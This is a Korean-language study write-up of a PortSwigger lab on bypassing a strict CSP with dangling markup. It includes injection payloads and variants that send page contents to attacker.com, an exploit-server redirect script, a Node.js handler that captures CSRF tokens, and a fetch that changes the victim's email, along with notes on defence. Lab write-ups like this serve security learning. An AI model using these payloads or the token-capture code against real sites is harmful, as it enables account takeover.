# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — CSP 우회 / Dangling Markup / CSRF 토큰 탈취 / 이메일 변경
- **링크**: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

## 목표

매우 엄격한 CSP로 스크립트 실행이 완전히 차단된 환경에서, HTML 인젝션만으로 Dangling Markup 기법을 사용해 피해자의 CSRF 토큰을 탈취하고, 공격 서버의 JS로 이메일을 변경한다.

## 핵심 원리 — Dangling Markup이란

```
[일반 XSS]
  HTML + 스크립트 삽입 → CSP 차단

[Dangling Markup]
  HTML 인젝션만 사용 (스크립트 불필요)
  → CSP 우회 가능
  → 페이지의 민감한 데이터를 GET 요청으로 유출
```

**"dangling"(대롱대롱 매달린) 의 의미**:

```html
<!-- 정상 img 태그 -->
<img src="http://attacker.com/img.png">

<!-- Dangling Markup — src 속성이 닫히지 않음 -->
<img src="http://attacker.com?
          ↑
          " 를 닫지 않으면 브라우저가 이후 HTML 내용을
          src 속성값으로 읽어 들임
          → 페이지 내용이 attacker.com 의 GET 요청에 포함됨
```

## 공격 흐름

```
1. [공격자] 취약 페이지에 Dangling Markup 삽입
   → 삽입된 <img src="http://exploit-server.com? 가 CSRF 토큰이 포함된
     나머지 HTML을 속성값으로 흡수
   → 피해자 브라우저가 exploit-server.com 으로 이미지 GET 요청 전송
   → URL에 CSRF 토큰 포함

2. [공격 서버] CSRF 토큰 수신
   → 서버 로그 또는 JS 에서 토큰 추출

3. [공격 서버 JS] 추출한 토큰으로 이메일 변경 POST 요청
   → 서버는 유효한 CSRF 토큰이 있으므로 정상 요청으로 처리
   → 이메일 변경 완료 → 계정 탈취
```

## Dangling Markup 인젝션 상세

### 인젝션 페이로드 (취약 파라미터에 삽입)

```html
"><img src="https://EXPLOIT-SERVER.com?
```

### 페이지 구조에서의 동작

취약 페이지가 파라미터를 HTML에 반영할 때:

```html
<!-- 원래 페이지 -->
<input type="email" value="USER_INPUT">
<input type="hidden" name="csrf" value="ABC123TOKEN">

<!-- Dangling Markup 삽입 후 -->
<input type="email" value=""><img src="https://exploit-server.com?
<input type="hidden" name="csrf" value="ABC123TOKEN">
```

브라우저 파싱:

```
<img src=" 가 열림 → src 값 수집 시작
이후 HTML을 src 값으로 읽음:
  https://exploit-server.com?
  [줄바꿈 제거]
  <input type="hidden" name="csrf" value="ABC123TOKEN">
  ...
다음 " 를 만나면 src 값 종료

→ 브라우저 GET 요청:
  GET https://exploit-server.com?%0a%3cinput+type%3d"hidden"+name%3d"csrf"+value%3d"ABC123TOKEN">...
                                                                              ↑
                                                                         CSRF 토큰 포함!
```

## 공격 서버(Exploit Server) 구성

### 1단계: 피해자를 취약 URL로 유도하는 페이지

```html
<!-- exploit server 에 호스팅 -->
<script>
// 피해자가 이 페이지를 방문하면:

// 1단계: Dangling Markup으로 CSRF 토큰 탈취
// 피해자 브라우저를 취약 URL 로 보냄 (dangling markup 포함)
window.location = 'https://VULNERABLE-SITE.com/my-account?email="><img src="https://EXPLOIT-SERVER.com/capture?';
</script>
```

### 2단계: 서버에서 CSRF 토큰 캡처

공격 서버가 이미지 요청을 수신:

```
GET /capture?%0a%3cinput+type%3d"hidden"+name%3d"csrf"+value%3d"ABC123TOKEN"...
```

URL 디코딩 후 정규식으로 토큰 추출:

```javascript
// 서버 측 처리 (Node.js 예시)
app.get('/capture', (req, res) => {
    const rawQuery = decodeURIComponent(req.url);
    const match = rawQuery.match(/name="csrf"\s+value="([^"]+)"/);
    if (match) {
        const csrfToken = match[1];
        console.log('[CSRF Token 탈취]', csrfToken);
        // 토큰으로 이메일 변경 요청 자동 실행
    }
    res.status(200).end();
});
```

### 3단계: 탈취한 토큰으로 이메일 변경

```javascript
// 공격 서버의 JS가 피해자 세션 + 탈취 CSRF 토큰으로 요청
fetch('https://VULNERABLE-SITE.com/my-account/change-email', {
    method: 'POST',
    credentials: 'include',   // 피해자 세션 쿠키 자동 포함
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `csrf=${csrfToken}&email=attacker@evil.com`
});
```

## 024 랩(XSS + CSRF)과 비교

| 항목 | 024 랩 (XSS + CSRF) | 029 랩 (Dangling Markup + CSRF) |
|------|--------------------|---------------------------------|
| 전제 조건 | XSS 실행 가능 | HTML 인젝션만 가능 (XSS 차단) |
| CSP 우회 | 필요 없음 (XSS 실행됨) | 핵심 — 스크립트 없이 데이터 탈취 |
| CSRF 토큰 획득 | 피해자 브라우저에서 JS로 직접 읽음 | GET 요청 URL에 포함되어 유출 |
| 이메일 변경 | 피해자 브라우저에서 직접 POST | 공격 서버에서 피해자 세션 재사용 |
| 스크립트 실행 위치 | 피해자 브라우저 (취약 사이트) | 공격 서버 (CSP 무관) |

## 핵심 정리

- Dangling Markup은 스크립트 없이 HTML 인젝션만으로 페이지 내용을 외부로 유출하는 기법이다.
- CSP가 스크립트를 완전히 차단해도 이미지 `src` 속성을 통한 GET 요청은 막기 어렵다.
- 탈취한 CSRF 토큰을 공격 서버에서 사용하면 피해자 대신 상태 변경 요청을 전송할 수 있다.
- **방어**:
  - CSP `img-src 'self'` — 외부 이미지 로드 차단 (Dangling Markup 유출 차단)
  - `default-src 'none'` 수준의 엄격한 CSP
  - 출력 인코딩으로 HTML 인젝션 자체를 방어하는 것이 근본 해결책

## 배운 점 및 추가 학습

### 1. Dangling Markup 이 작동하는 브라우저 조건

```html
<!-- src에 닫는 " 없음 → 다음 " 까지 읽음 -->
<img src="http://attacker.com?
text captured here including "csrf" value="TOKEN">

<!-- 브라우저 동작:
  1. src=" 이후 내용을 URL로 읽기 시작
  2. 줄바꿈(\n)은 URL에서 %0a 로 인코딩되거나 무시
  3. 다음 " 를 만나면 src 속성 종료
  4. 수집된 URL 로 GET 요청 전송
-->

<!-- 주의: 현대 브라우저는 src에 개행 포함 시 요청 차단하는 경우 있음 -->
<!-- 대안: 줄바꿈 없는 위치에 삽입, 또는 form action 활용 -->
```

### 2. Dangling Markup 변형 기법

```html
<!-- img src 방식 (기본) -->
"><img src="http://attacker.com?

<!-- form action 방식 (개행 문제 우회 가능) -->
"><form action="http://attacker.com?"><input name="

<!-- meta refresh 방식 -->
"><meta http-equiv="refresh" content="0; url=http://attacker.com?

<!-- script src 방식 (CSP가 external script 허용하는 경우) -->
"><script src="http://attacker.com?

<!-- link prefetch (일부 CSP 우회) -->
"><link rel="prefetch" href="http://attacker.com?
```

### 3. CSP와 이미지 요청의 관계

```
CSP 설정별 Dangling Markup 차단 여부:

script-src 'none'           → 스크립트 차단 O / 이미지 요청 차단 X
default-src 'self'          → 스크립트 차단 O / 외부 이미지 요청 차단 O ← 방어
img-src 'self'              → 외부 이미지 요청 차단 O ← 방어
img-src *                   → 외부 이미지 허용 → Dangling Markup 유효

→ Dangling Markup 방어 핵심: img-src 를 'self' 또는 특정 도메인만 허용
```

### 4. CSRF 토큰이 GET 요청 URL에 포함되는 원리

```
페이지 HTML:
  <input type="hidden" name="csrf" value="SECRET_TOKEN">

Dangling img src 수집 후 요청:
  GET http://attacker.com?...name="csrf" value="SECRET_TOKEN"...

URL 디코딩:
  http://attacker.com?
  <input type="hidden" name="csrf" value="SECRET_TOKEN">
  (나머지 HTML...)

→ 공격자 서버 로그에서 정규식으로 토큰 추출:
  /value="([a-zA-Z0-9]{32,})"/  또는
  /name="csrf"\s+value="([^"]+)"/
```

### 5. 공격 서버 없이 Dangling Markup 실습하기 (로컬 확인)

```bash
# 로컬 서버에서 요청 로그 확인
python3 -m http.server 8080

# 또는 ngrok으로 외부 노출
ngrok http 8080
# → 외부에서 접근 가능한 주소 획득

# 요청이 오면 URL 디코딩 후 확인
python3 -c "import urllib.parse; print(urllib.parse.unquote('/capture?...'))"
```

### 6. Dangling Markup vs XSS 비교 — 공격자 선택 기준

```
XSS 가능한 경우:
  → XSS 사용 (더 강력, 피해자 브라우저에서 직접 모든 것 제어 가능)
  → CSRF 토큰 직접 읽기, 쿠키 탈취, 임의 요청 전송

XSS 불가(CSP 차단) + HTML 인젝션 가능한 경우:
  → Dangling Markup 사용
  → 페이지 내용 일부 유출만 가능
  → CSRF 토큰, 비밀번호 일부, 숨겨진 폼 값 등

HTML 인젝션도 불가한 경우:
  → 다른 공격 벡터 탐색 (SSRF, 로직 버그 등)
  → XSS + CSP 우회 조합 연구 (Angular, JSONP 등)
```

### 7. 이 공격이 성립하는 이유 — SOP와 이미지 요청

```
Same-Origin Policy (SOP):
  JS로 다른 origin 의 응답 읽기 → 차단
  이미지/스크립트/스타일시트 로드 → 허용 (cross-origin)

Dangling Markup은 SOP 를 우회:
  → JS 응답 읽기가 아님
  → 이미지 src 로드 요청 (SOP 적용 안 됨)
  → 요청 URL 에 데이터 포함 → 서버 로그로 데이터 유출

CSP도 이미지 제한이 없으면 차단 못 함:
  → img-src * 또는 img-src 미설정 → 외부 이미지 허용
  → Dangling Markup 유효
```
